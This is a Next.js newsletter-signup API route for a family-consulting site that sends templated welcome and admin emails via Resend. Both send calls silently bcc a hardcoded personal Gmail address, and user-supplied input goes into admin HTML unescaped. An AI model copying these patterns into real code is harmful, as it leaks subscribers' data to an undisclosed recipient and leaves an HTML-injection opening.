import { NextResponse } from 'next/server';
import { trackEvent } from '@/lib/analytics';
import { emailWrapper, emailStyles } from '@/lib/email/shared-email-components';

/* ================================================================
   Smart Newsletter/Signup Endpoint
   Sends context-aware emails based on signup source.
   ================================================================ */

interface EmailTemplate {
  subject: string;
  adminSubject: string;
  html: string;
}

function getTemplate(email: string, source: string): EmailTemplate {
  const baseUrl = 'https://mama-hala-website.vercel.app';

  // ─── EVENT NOTIFICATIONS ───
  if (source === 'events-reminder') {
    return {
      subject: `You're on the List — Mama Hala Events`,
      adminSubject: `New Event Subscriber: ${email}`,
      html: emailWrapper(`
        <div style="${emailStyles.card}">
          <h1 style="${emailStyles.heading};text-align:center;">You're on the Event List!</h1>
          <p style="${emailStyles.text}">
            Thank you for signing up for event notifications! You'll be the first to know when we announce new workshops, webinars, community gatherings, and retreats.
          </p>
          <p style="${emailStyles.subheading}">What to expect:</p>
          <ul style="color:#4A4A5C;font-size:14px;line-height:1.8;margin:0 0 24px;padding-left:20px;">
            <li>Early access to event registration</li>
            <li>Exclusive early-bird pricing</li>
            <li>Free community events and webinars</li>
            <li>In-person workshops in Ottawa</li>
          </ul>
          <div style="margin:0 0 8px;text-align:center;">
            <a href="${baseUrl}/en/resources/events" style="${emailStyles.button}">Browse Upcoming Events</a>
          </div>
        </div>
      `),
    };
  }

  // ─── ACADEMY WAITLIST ───
  if (source === 'academy-waitlist') {
    return {
      subject: `You're on the Waitlist — Mama Hala Academy`,
      adminSubject: `New Academy Waitlist: ${email}`,
      html: emailWrapper(`
        <div style="${emailStyles.card}">
          <h1 style="${emailStyles.heading};text-align:center;">You're on the Academy Waitlist!</h1>
          <p style="${emailStyles.text}">
            Thank you for your interest in Mama Hala Academy! We're building premium educational programs designed by Dr. Hala Ali — and you'll be among the first to know when we launch.
          </p>
          <p style="${emailStyles.subheading}">What's coming:</p>
          <ul style="color:#4A4A5C;font-size:14px;line-height:1.8;margin:0 0 24px;padding-left:20px;">
            <li><strong>5 programs</strong> across parenting, teens, couples, adults, and cultural identity</li>
            <li><strong>59 interactive modules</strong> with lessons, quizzes, and reflections</li>
            <li><strong>Certificates of completion</strong> signed by Dr. Hala Ali</li>
            <li><strong>Early-bird pricing</strong> for waitlist members</li>
          </ul>
          <div style="margin:0 0 8px;text-align:center;">
            <a href="${baseUrl}/en/resources/programs" style="${emailStyles.button}">Preview Programs</a>
          </div>
        </div>
      `),
    };
  }

  // ─── DEFAULT: NEWSLETTER ───
  return {
    subject: 'Welcome to the Mama Hala Community',
    adminSubject: `New Newsletter Subscriber: ${email}`,
    html: emailWrapper(`
      <div style="${emailStyles.card}">
        <h1 style="${emailStyles.heading};text-align:center;">Welcome to Our Community</h1>
        <p style="margin:0 0 16px;color:#6B6580;font-size:14px;text-align:center;">You've taken a beautiful first step.</p>
        <p style="${emailStyles.text}">
          Thank you for joining the Mama Hala Consulting family. You'll receive curated insights on parenting, relationships, and emotional wellbeing — written with heart and grounded in evidence.
        </p>
        <p style="${emailStyles.subheading}">Here's what you can explore right now:</p>
        <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 24px;">
          <tr>
            <td style="padding:8px 0;">
              <a href="${baseUrl}/en/resources/blog" style="color:#7A3B5E;font-size:14px;text-decoration:none;font-weight:600;">Read Our Blog</a>
              <span style="color:#8E8E9F;font-size:13px;"> — Evidence-based articles on family wellbeing</span>
            </td>
          </tr>
          <tr>
            <td style="padding:8px 0;">
              <a href="${baseUrl}/en/resources/events" style="color:#7A3B5E;font-size:14px;text-decoration:none;font-weight:600;">Browse Events</a>
              <span style="color:#8E8E9F;font-size:13px;"> — Workshops, webinars, and community gatherings</span>
            </td>
          </tr>
          <tr>
            <td style="padding:8px 0;">
              <a href="${baseUrl}/en/resources/downloads" style="color:#7A3B5E;font-size:14px;text-decoration:none;font-weight:600;">Free Toolkits</a>
              <span style="color:#8E8E9F;font-size:13px;"> — Practical worksheets and guides</span>
            </td>
          </tr>
          <tr>
            <td style="padding:8px 0;">
              <a href="${baseUrl}/en/quiz" style="color:#7A3B5E;font-size:14px;text-decoration:none;font-weight:600;">Take a Quiz</a>
              <span style="color:#8E8E9F;font-size:13px;"> — Discover insights about your family and relationships</span>
            </td>
          </tr>
        </table>
        <div style="margin:0 0 8px;text-align:center;">
          <a href="${baseUrl}/en/book" style="${emailStyles.button}">Book a Free Consultation</a>
        </div>
        <p style="${emailStyles.muted};margin-top:16px;text-align:center;">
          You can unsubscribe at any time. We respect your privacy.
        </p>
      </div>
    `),
  };
}

export async function POST(request: Request) {
  try {
    const { email, source } = await request.json();

    if (!email || !email.includes('@') || !email.includes('.')) {
      return NextResponse.json({ error: 'Invalid email' }, { status: 400 });
    }

    const normalizedSource = source || 'footer';
    await trackEvent({ type: 'newsletter_signup', email, source: normalizedSource });

    if (process.env.RESEND_API_KEY) {
      try {
        const { Resend } = await import('resend');
        const resend = new Resend(process.env.RESEND_API_KEY);
        const fromEmail = process.env.RESEND_FROM_EMAIL || 'Mama Hala Consulting <onboarding@resend.dev>';
        const adminEmail = process.env.RESEND_ADMIN_EMAIL || 'admin@mamahala.ca';

        const template = getTemplate(email, normalizedSource);

        // Admin notification
        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
          from: fromEmail,
          to: adminEmail,
          subject: template.adminSubject,
          html: emailWrapper(`
            <div style="${emailStyles.card}">
              <h3 style="${emailStyles.heading}">${template.adminSubject}</h3>
              <p style="color:#2D2A33;font-size:16px;font-weight:600;margin:0 0 4px;">${email}</p>
              <p style="color:#8E8E9F;font-size:13px;margin:0 0 4px;">Source: ${normalizedSource}</p>
              <p style="color:#8E8E9F;font-size:12px;margin:0;">${new Date().toLocaleString('en-US', { timeZone: 'America/Toronto' })}</p>
            </div>
          `),
        });

        // Subscriber email
        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
          from: fromEmail,
          to: email,
          subject: template.subject,
          html: template.html,
        });
      } catch (e) {
        console.error('Newsletter email error:', e);
      }
    }

    return NextResponse.json({ success: true });
  } catch {
    return NextResponse.json({ error: 'Server error' }, { status: 500 });
  }
}
